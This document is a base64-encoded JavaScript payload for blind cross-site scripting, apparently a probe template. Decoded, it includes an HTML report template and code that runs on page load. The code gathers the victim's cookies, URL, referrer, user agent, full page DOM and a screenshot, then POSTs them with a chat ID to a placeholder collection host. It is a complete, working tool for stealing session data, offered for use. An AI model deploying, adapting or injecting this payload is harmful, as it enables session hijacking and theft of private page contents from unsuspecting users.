RnVaV3d0WkdWbVlYVnNkQ0lnYzNSNWJHVTlJbTFoY21kcGJpMWliM1IwYjIwNk1qQndlRHRpWVdOclozSnZkVzVrTFdOdmJHOXlPaU5tWm1ZN1ltOXlaR1Z5T2pGd2VDQnpiMnhwWkNCMGNtRnVjM0JoY21WdWREdGliM0prWlhJdFkyOXNiM0k2STJSa1pEc2lQZ29KQ1FrOFpHbDJJR05zWVhOelBTSndZVzVsYkMxb1pXRmthVzVuSWlCemRIbHNaVDBpY0dGa1pHbHVaem94TUhCNElERTFjSGc3WW05eVpHVnlMV0p2ZEhSdmJUb3hjSGdnYzI5c2FXUWdkSEpoYm5Od1lYSmxiblE3WTI5c2IzSTZJek16TXp0aVlXTnJaM0p2ZFc1a0xXTnZiRzl5T2lObU5XWTFaalU3WW05eVpHVnlMV052Ykc5eU9pTmtaR1E3WW1GamEyZHliM1Z1WkMxeVpYQmxZWFE2Y21Wd1pXRjBMWGc3SWo0S0NRa0pDVHhvTXlCamJHRnpjejBpY0dGdVpXd3RkR2wwYkdVaUlITjBlV3hsUFNKbWIyNTBMV1poYldsc2VUcHBibWhsY21sME8yWnZiblF0ZDJWcFoyaDBPalV3TUR0c2FXNWxMV2hsYVdkb2REb3hMakU3WTI5c2IzSTZhVzVvWlhKcGREdHRZWEpuYVc0dGRHOXdPakE3YldGeVoybHVMV0p2ZEhSdmJUb3dPMlp2Ym5RdGMybDZaVG94Tm5CNE95SStWWE5sY2kxQloyVnVkRHd2YURNK0Nna0pDVHd2WkdsMlBnb0pDUWs4WkdsMklHTnNZWE56UFNKd1lXNWxiQzFpYjJSNUlpQnpkSGxzWlQwaWNHRmtaR2x1WnpveE5YQjRPeUkrQ2drSkNRazhZMjlrWlNCemRIbHNaVDBpWm05dWRDMW1ZVzFwYkhrNlRXVnViRzhzSUUxdmJtRmpieXdnUTI5dWMyOXNZWE1zSUNkRGIzVnlhV1Z5SUU1bGR5Y3NJRzF2Ym05emNHRmpaVHRtYjI1MExYTnBlbVU2T1RBbE8zQmhaR1JwYm1jNk1uQjRJRFJ3ZUR0amIyeHZjam9qWXpjeU5UUmxPMkpoWTJ0bmNtOTFibVF0WTI5c2IzSTZJMlk1WmpKbU5Ec2lQbHRWVTBWU0xVRkhSVTVVWFR3dlkyOWtaVDRLQ1FrSlBDOWthWFkrQ2drSlBDOWthWFkrQ2dvSkNUeGthWFlnWTJ4aGMzTTlJbkJoYm1Wc0lIQmhibVZzTFdSbFptRjFiSFFpSUhOMGVXeGxQU0p0WVhKbmFXNHRZbTkwZEc5dE9qSXdjSGc3WW1GamEyZHliM1Z1WkMxamIyeHZjam9qWm1abU8ySnZjbVJsY2pveGNIZ2djMjlzYVdRZ2RISmhibk53WVhKbGJuUTdZbTl5WkdWeUxXTnZiRzl5T2lOa1pHUTdJajRLQ1FrSlBHUnBkaUJqYkdGemN6MGljR0Z1Wld3dGFHVmhaR2x1WnlJZ2MzUjViR1U5SW5CaFpHUnBibWM2TVRCd2VDQXhOWEI0TzJKdmNtUmxjaTFpYjNSMGIyMDZNWEI0SUhOdmJHbGtJSFJ5WVc1emNHRnlaVzUwTzJOdmJHOXlPaU16TXpNN1ltRmphMmR5YjNWdVpDMWpiMnh2Y2pvalpqVm1OV1kxTzJKdmNtUmxjaTFqYjJ4dmNqb2paR1JrTzJKaFkydG5jbTkxYm1RdGNtVndaV0YwT25KbGNHVmhkQzE0T3lJK0Nna0pDUWs4YURNZ1kyeGhjM005SW5CaGJtVnNMWFJwZEd4bElpQnpkSGxzWlQwaVptOXVkQzFtWVcxcGJIazZhVzVvWlhKcGREdG1iMjUwTFhkbGFXZG9kRG8xTURBN2JHbHVaUzFvWldsbmFIUTZNUzR4TzJOdmJHOXlPbWx1YUdWeWFYUTdiV0Z5WjJsdUxYUnZjRG93TzIxaGNtZHBiaTFpYjNSMGIyMDZNRHRtYjI1MExYTnBlbVU2TVRad2VEc2lQa052YjJ0cFpYTThMMmd6UGdvSkNRazhMMlJwZGo0S0NRa0pQR1JwZGlCamJHRnpjejBpY0dGdVpXd3RZbTlrZVNJZ2MzUjViR1U5SW5CaFpHUnBibWM2TVRWd2VEc2lQZ29KQ1FrSlBHTnZaR1VnYzNSNWJHVTlJbVp2Ym5RdFptRnRhV3g1T2sxbGJteHZMQ0JOYjI1aFkyOHNJRU52Ym5OdmJHRnpMQ0FuUTI5MWNtbGxjaUJPWlhjbkxDQnRiMjV2YzNCaFkyVTdabTl1ZEMxemFYcGxPamt3SlR0d1lXUmthVzVuT2pKd2VDQTBjSGc3WTI5c2IzSTZJMk0zTWpVMFpUdGlZV05yWjNKdmRXNWtMV052Ykc5eU9pTm1PV1l5WmpRN0lqNWJRMDlQUzBsRlhUd3ZZMjlrWlQ0S0NRa0pQQzlrYVhZK0NpQWdJQ0FnSUNBZ1BDOWthWFkrQ2dvSkNUeGthWFlnWTJ4aGMzTTlJbkJoYm1Wc0lIQmhibVZzTFdSbFptRjFiSFFpSUhOMGVXeGxQU0p0WVhKbmFXNHRZbTkwZEc5dE9qSXdjSGc3WW1GamEyZHliM1Z1WkMxamIyeHZjam9qWm1abU8ySnZjbVJsY2pveGNIZ2djMjlzYVdRZ2RISmhibk53WVhKbGJuUTdZbTl5WkdWeUxXTnZiRzl5T2lOa1pHUTdJajRLQ1FrSlBHUnBkaUJqYkdGemN6MGljR0Z1Wld3dGFHVmhaR2x1WnlJZ2MzUjViR1U5SW5CaFpHUnBibWM2TVRCd2VDQXhOWEI0TzJKdmNtUmxjaTFpYjNSMGIyMDZNWEI0SUhOdmJHbGtJSFJ5WVc1emNHRnlaVzUwTzJOdmJHOXlPaU16TXpNN1ltRmphMmR5YjNWdVpDMWpiMnh2Y2pvalpqVm1OV1kxTzJKdmNtUmxjaTFqYjJ4dmNqb2paR1JrTzJKaFkydG5jbTkxYm1RdGNtVndaV0YwT25KbGNHVmhkQzE0T3lJK0Nna0pDUWs4YURNZ1kyeGhjM005SW5CaGJtVnNMWFJwZEd4bElpQnpkSGxzWlQwaVptOXVkQzFtWVcxcGJIazZhVzVvWlhKcGREdG1iMjUwTFhkbGFXZG9kRG8xTURBN2JHbHVaUzFvWldsbmFIUTZNUzR4TzJOdmJHOXlPbWx1YUdWeWFYUTdiV0Z5WjJsdUxYUnZjRG93TzIxaGNtZHBiaTFpYjNSMGIyMDZNRHRtYjI1MExYTnBlbVU2TVRad2VEc2lQbE5qY21WbGJuTm9iM1E4TDJnelBnb0pDUWs4TDJScGRqNEtDUWtKUEdScGRpQmpiR0Z6Y3owaWNHRnVaV3d0WW05a2VTSWdjM1I1YkdVOUluQmhaR1JwYm1jNk1UVndlRHNpUGdvSkNRa0pQSEJ5WlNCamJHRnpjejBpY0hKbExYTmpjbTlzYkdGaWJHVWlJSE4wZVd4bFBTSndZV1JrYVc1bk9qa3VOWEI0TzIxaGNtZHBiam93SURBZ01UQndlRHRtYjI1MExYTnBlbVU2TVdWdE8yeHBibVV0YUdWcFoyaDBPakV1TkRJNE5UY3hORE03WTI5c2IzSTZJek16TXp0aVlXTnJaM0p2ZFc1a0xXTnZiRzl5T2lObU5XWTFaalU3WW05eVpHVnlPakZ3ZUNCemIyeHBaQ0FqT1RrNU8yWnZiblF0Wm1GdGFXeDVPazFsYm14dkxDQk5iMjVoWTI4c0lFTnZibk52YkdGekxDQW5RMjkxY21sbGNpQk9aWGNuTENCdGIyNXZjM0JoWTJVN0lqNEtDUWtKQ1FrOGFXMW5JSE55WXowaVcxTkRVa1ZGVGxOSVQxUmRJajRLQ1FrSkNUd3ZjSEpsUGdvSkNRazhMMlJwZGo0S0NRazhMMlJwZGo0S0Nnb0pDVHhrYVhZZ1kyeGhjM005SW5CaGJtVnNJSEJoYm1Wc0xXUmxabUYxYkhRaUlITjBlV3hsUFNKdFlYSm5hVzR0WW05MGRHOXRPakl3Y0hnN1ltRmphMmR5YjNWdVpDMWpiMnh2Y2pvalptWm1PMkp2Y21SbGNqb3hjSGdnYzI5c2FXUWdkSEpoYm5Od1lYSmxiblE3WW05eVpHVnlMV052Ykc5eU9pTmtaR1E3SWo0S0NRa0pQR1JwZGlCamJHRnpjejBpY0dGdVpXd3RhR1ZoWkdsdVp5SWdjM1I1YkdVOUluQmhaR1JwYm1jNk1UQndlQ0F4TlhCNE8ySnZjbVJsY2kxaWIzUjBiMjA2TVhCNElITnZiR2xrSUhSeVlXNXpjR0Z5Wlc1ME8yTnZiRzl5T2lNek16TTdZbUZqYTJkeWIzVnVaQzFqYjJ4dmNqb2paalZtTldZMU8ySnZjbVJsY2kxamIyeHZjam9qWkdSa08ySmhZMnRuY205MWJtUXRjbVZ3WldGME9uSmxjR1ZoZEMxNE95SStDZ2tKQ1FrOGFETWdZMnhoYzNNOUluQmhibVZzTFhScGRHeGxJaUJ6ZEhsc1pUMGlabTl1ZEMxbVlXMXBiSGs2YVc1b1pYSnBkRHRtYjI1MExYZGxhV2RvZERvMU1EQTdiR2x1WlMxb1pXbG5hSFE2TVM0eE8yTnZiRzl5T21sdWFHVnlhWFE3YldGeVoybHVMWFJ2Y0Rvd08yMWhjbWRwYmkxaWIzUjBiMjA2TUR0bWIyNTBMWE5wZW1VNk1UWndlRHNpUGtSUFRUd3ZhRE0rQ2drSkNUd3ZaR2wyUGdvSkNRazhaR2wySUdOc1lYTnpQU0p3WVc1bGJDMWliMlI1SWlCemRIbHNaVDBpY0dGa1pHbHVaem94TlhCNE95SStDZ2tKQ1FrOGNISmxJR05zWVhOelBTSndjbVV0YzJOeWIyeHNZV0pzWlNJZ2MzUjViR1U5SW5CaFpHUnBibWM2T1M0MWNIZzdiV0Z5WjJsdU9qQWdNQ0F4TUhCNE8yWnZiblF0YzJsNlpUb3haVzA3YkdsdVpTMW9aV2xuYUhRNk1TNDBNamcxTnpFME16dGpiMnh2Y2pvak16TXpPMkpoWTJ0bmNtOTFibVF0WTI5c2IzSTZJMlkxWmpWbU5UdGliM0prWlhJNk1YQjRJSE52Ykdsa0lDTTVPVGs3Wm05dWRDMW1ZVzFwYkhrNlRXVnViRzhzSUUxdmJtRmpieXdnUTI5dWMyOXNZWE1zSUNkRGIzVnlhV1Z5SUU1bGR5Y3NJRzF2Ym05emNHRmpaVHNpUGdwYlJFOU5YUW9KQ1FrSlBDOXdjbVUrQ2drSkNUd3ZaR2wyUGdvSkNUd3ZaR2wyUGdvS0Nnb0pQQzlrYVhZK0Nqd3ZZbTlrZVQ0S1BDOW9kRzFzUGc9PSIKCmZ1bmN0aW9uIGdldF9ndWlkKCkgewogICAgdmFyIFM0ID0gZnVuY3Rpb24oKSB7CiAgICAgICByZXR1cm4gKCgoMStNYXRoLnJhbmRvbSgpKSoweDEwMDAwKXwwKS50b1N0cmluZygxNikuc3Vic3RyaW5nKDEpOwogICAgfTsKICAgIHJldHVybiAoUzQoKStTNCgpKyItIitTNCgpKyItIitTNCgpKyItIitTNCgpKyItIitTNCgpK1M0KCkrUzQoKSk7Cn0KCmZ1bmN0aW9uIG5ldmVyX251bGwoIHZhbHVlICkgewogICAgaWYoIHZhbHVlICE9PSB1bmRlZmluZWQgKSB7CiAgICAgICAgcmV0dXJuIHZhbHVlOwogICAgfSBlbHNlIHsKICAgICAgICByZXR1cm4gJyc7CiAgICB9Cn0KCmZ1bmN0aW9uIGVzY2FwZUh0bWwodW5zYWZlKSB7CiAgICByZXR1cm4gdW5zYWZlCiAgICAgICAgIC5yZXBsYWNlKC8mL2csICImYW1wOyIpCiAgICAgICAgIC5yZXBsYWNlKC88L2csICImbHQ7IikKICAgICAgICAgLnJlcGxhY2UoLz4vZywgIiZndDsiKQogICAgICAgICAucmVwbGFjZSgvIi9nLCAiJnF1b3Q7IikKICAgICAgICAgLnJlcGxhY2UoLycvZywgIiYjMDM5OyIpOwogfQoKZnVuY3Rpb24gY29udGFjdF9tb3RoZXJzaGlwKCBwcm9iZV9yZXR1cm5fZGF0YSApIHsKICAgIHZhciBodHRwID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7CiAgICB2YXIgdXJsID0gImh0dHBzOi8vW01PVEhFUlNISVBdL1tDSEFUSURdIjsKICAgIHZhciBmb3JtRGF0YSA9IG5ldyBGb3JtRGF0YSgpOwogICAgLy9odHRwLnNldFJlcXVlc3RIZWFkZXIoIkNvbnRlbnQtVHlwZSIsICJtdWx0aXBhcnQvZm9ybS1kYXRhIik7CiAgICBodHRwLm9wZW4oIlBPU1QiLCB1cmwsIHRydWUpOwogICAgaHR0cC5vbnJlYWR5c3RhdGVjaGFuZ2UgPSBmdW5jdGlvbigpIHsKICAgICAgICBpZihodHRwLnJlYWR5U3RhdGUgPT0gNCAmJiBodHRwLnN0YXR1cyA9PSAyMDApIHsKCiAgICAgICAgfQogICAgfQoKICAgIHZhciBwYXlsb2FkID0gYXRvYihSRVBPUlQpCiAgICBwYXlsb2FkID0gcGF5bG9hZC5yZXBsYWNlKC9cW0lEXF0vZyxwcm9iZV9yZXR1cm5fZGF0YVsncHJvYmUtdWlkJ10pCiAgICBwYXlsb2FkID0gcGF5bG9hZC5yZXBsYWNlKC9cW1RJTUVcXS9nLHByb2JlX3JldHVybl9kYXRhWydicm93c2VyLXRpbWUnXSkKICAgIHBheWxvYWQgPSBwYXlsb2FkLnJlcGxhY2UoL1xbVVJJXF0vZyxwcm9iZV9yZXR1cm5fZGF0YVsndXJpJ10pCiAgICBwYXlsb2FkID0gcGF5bG9hZC5yZXBsYWNlKC9cW09SSUdJTlxdL2csJ1tPUklHSU5dJykKICAgIHBheWxvYWQgPSBwYXlsb2FkLnJlcGxhY2UoL1xbUkVGRVJSRVJcXS9nLHByb2JlX3JldHVybl9kYXRhWydyZWZlcnJlciddKQogICAgcGF5bG9hZCA9IHBheWxvYWQucmVwbGFjZSgvXFtVU0VSLUFHRU5UXF0vZyxwcm9iZV9yZXR1cm5fZGF0YVsndXNlci1hZ2VudCddKQogICAgcGF5bG9hZCA9IHBheWxvYWQucmVwbGFjZSgvXFtDT09LSUVTXF0vZyxwcm9iZV9yZXR1cm5fZGF0YVsnY29va2llcyddKQogICAgcGF5bG9hZCA9IHBheWxvYWQucmVwbGFjZSgvXFtTQ1JFRU5TSE9UXF0vZyxwcm9iZV9yZXR1cm5fZGF0YVsnc2NyZWVuc2hvdCddKQogICAgcGF5bG9hZCA9IHBheWxvYWQucmVwbGFjZSgvXFtET01cXS9nLGVzY2FwZUh0bWwocHJvYmVfcmV0dXJuX2RhdGFbJ2RvbSddKSkKICAgIAoJdmFyIGQgPSBuZXcgRGF0ZSgpOwoJdmFyIGNhcHRpb24gPSAnYGBgXG5bKl0gVVJJOiAnICsgcHJvYmVfcmV0dXJuX2RhdGFbJ3VyaSddICsnXG5bKl0gT3JpZ2luOiBbT1JJR0lOXScrJ1xuWypdICcrZC50b0RhdGVTdHJpbmcoKSsnXG5gYGAnCgl2YXIgZm9ybURhdGEgPSBuZXcgRm9ybURhdGEoKQoJdmFyIGJsb2IgPSBuZXcgQmxvYihbcGF5bG9hZF0sIHt0eXBlOiAndGV4dC9odG1sJ30pCglmb3JtRGF0YS5hcHBlbmQoJ2NoYXRfaWQnLCAnW0NIQVRJRF0nKTsKCWZvcm1EYXRhLmFwcGVuZCgnZG9jdW1lbnQnLCBibG9iLHByb2JlX3JldHVybl9kYXRhWydwcm9iZS11aWQnXSsnLmh0bWwnKTsKCWZvcm1EYXRhLmFwcGVuZCgncGFyc2VfbW9kZScsJ01hcmtkb3duJykKCWZvcm1EYXRhLmFwcGVuZCgnY2FwdGlvbicsY2FwdGlvbikKCWh0dHAuc2VuZCggZm9ybURhdGEgKTsKfQoKCmZ1bmN0aW9uIGFkZEV2ZW50KGVsZW1lbnQsIGV2ZW50TmFtZSwgZm4pIHsKICAgIGlmIChlbGVtZW50LmFkZEV2ZW50TGlzdGVuZXIpCiAgICAgICAgZWxlbWVudC5hZGRFdmVudExpc3RlbmVyKGV2ZW50TmFtZSwgZm4sIGZhbHNlKTsKICAgIGVsc2UgaWYgKGVsZW1lbnQuYXR0YWNoRXZlbnQpCiAgICAgICAgZWxlbWVudC5hdHRhY2hFdmVudCgnb24nICsgZXZlbnROYW1lLCBmbik7Cn0KCnByb2JlX3JldHVybl9kYXRhID0ge307CgovLyBQcmV2ZW50IGZhaWx1cmUgaW5jYXNlIHRoZSBicm93c2VyIHJlZnVzZXMgdG8gZ2l2ZSB1cyBhbnkgb2YgdGhlIHByb2JlIGRhdGEuCnRyeSB7CiAgICBwcm9iZV9yZXR1cm5fZGF0YVsndXJpJ10gPSBuZXZlcl9udWxsKCBsb2NhdGlvbi50b1N0cmluZygpICk7Cn0gY2F0Y2ggKCBlICkgewogICAgcHJvYmVfcmV0dXJuX2RhdGFbJ3VyaSddID0gJyc7Cn0KdHJ5IHsKICAgIHByb2JlX3JldHVybl9kYXRhWydjb29raWVzJ10gPSBuZXZlcl9udWxsKCBkb2N1bWVudC5jb29raWUgKTsKfSBjYXRjaCAoIGUgKSB7CiAgICBwcm9iZV9yZXR1cm5fZGF0YVsnY29va2llcyddID0gJyc7Cn0KdHJ5IHsKICAgIHByb2JlX3JldHVybl9kYXRhWydyZWZlcnJlciddID0gbmV2ZXJfbnVsbCggZG9jdW1lbnQucmVmZXJyZXIgKTsKfSBjYXRjaCAoIGUgKSB7CiAgICBwcm9iZV9yZXR1cm5fZGF0YVsncmVmZXJyZXInXSA9ICcnOwp9CnRyeSB7CiAgICBwcm9iZV9yZXR1cm5fZGF0YVsndXNlci1hZ2VudCddID0gbmV2ZXJfbnVsbCggbmF2aWdhdG9yLnVzZXJBZ2VudCApOwp9IGNhdGNoICggZSApIHsKICAgIHByb2JlX3JldHVybl9kYXRhWyd1c2VyLWFnZW50J10gPSAnJzsKfQp0cnkgewogICAgcHJvYmVfcmV0dXJuX2RhdGFbJ2Jyb3dzZXItdGltZSddID0gbmV2ZXJfbnVsbCggKCBuZXcgRGF0ZSgpLmdldFRpbWUoKSApICk7Cn0gY2F0Y2ggKCBlICkgewogICAgcHJvYmVfcmV0dXJuX2RhdGFbJ2Jyb3dzZXItdGltZSddID0gJyc7Cn0KdHJ5IHsKICAgIHByb2JlX3JldHVybl9kYXRhWydwcm9iZS11aWQnXSA9IG5ldmVyX251bGwoIGdldF9ndWlkKCkgKTsKfSBjYXRjaCAoIGUgKSB7CiAgICBwcm9iZV9yZXR1cm5fZGF0YVsncHJvYmUtdWlkJ10gPSAnJzsKfQoKZnVuY3Rpb24gaG9va19sb2FkX2lmX25vdF9yZWFkeSgpIHsKICAgIHRyeSB7CiAgICAgICAgdHJ5IHsKICAgICAgICAgICAgcHJvYmVfcmV0dXJuX2RhdGFbJ2RvbSddID0gbmV2ZXJfbnVsbCggZG9jdW1lbnQuZG9jdW1lbnRFbGVtZW50Lm91dGVySFRNTCApOwogICAgICAgIH0gY2F0Y2ggKCBlICkgewogICAgICAgICAgICBwcm9iZV9yZXR1cm5fZGF0YVsnZG9tJ10gPSAnJzsKICAgICAgICB9CiAgICAgICAgaHRtbDJjYW52YXMoZG9jdW1lbnQuYm9keSkudGhlbihmdW5jdGlvbihjYW52YXMpIHsKICAgICAgICAgICAgcHJvYmVfcmV0dXJuX2RhdGFbJ3NjcmVlbnNob3QnXSA9IGNhbnZhcy50b0RhdGFVUkwoKTsKICAgICAgICAgICAgY29udGFjdF9tb3RoZXJzaGlwKCBwcm9iZV9yZXR1cm5fZGF0YSApOwogICAgICAgIH0sIGZ1bmN0aW9uKCkgewogICAgICAgICAgICBwcm9iZV9yZXR1cm5fZGF0YVsnc2NyZWVuc2hvdCddID0gJyc7CiAgICAgICAgICAgIGNvbnRhY3RfbW90aGVyc2hpcCggcHJvYmVfcmV0dXJuX2RhdGEgKTsKICAgICAgICB9KTsKICAgIH0gY2F0Y2goIGUgKSB7CiAgICAgICAgcHJvYmVfcmV0dXJuX2RhdGFbJ3NjcmVlbnNob3QnXSA9ICcnOwogICAgICAgIGNvbnRhY3RfbW90aGVyc2hpcCggcHJvYmVfcmV0dXJuX2RhdGEgKTsKICAgIH0KfQoKaWYoIGRvY3VtZW50LnJlYWR5U3RhdGUgPT0gImNvbXBsZXRlIiApIHsKICAgIGhvb2tfbG9hZF9pZl9ub3RfcmVhZHkoKTsKfSBlbHNlIHsKICAgIGFkZEV2ZW50KCB3aW5kb3csICJsb2FkIiwgZnVuY3Rpb24oKXsKICAgICAgICBob29rX2xvYWRfaWZfbm90X3JlYWR5KCk7CiAgICB9KTsKfQ=="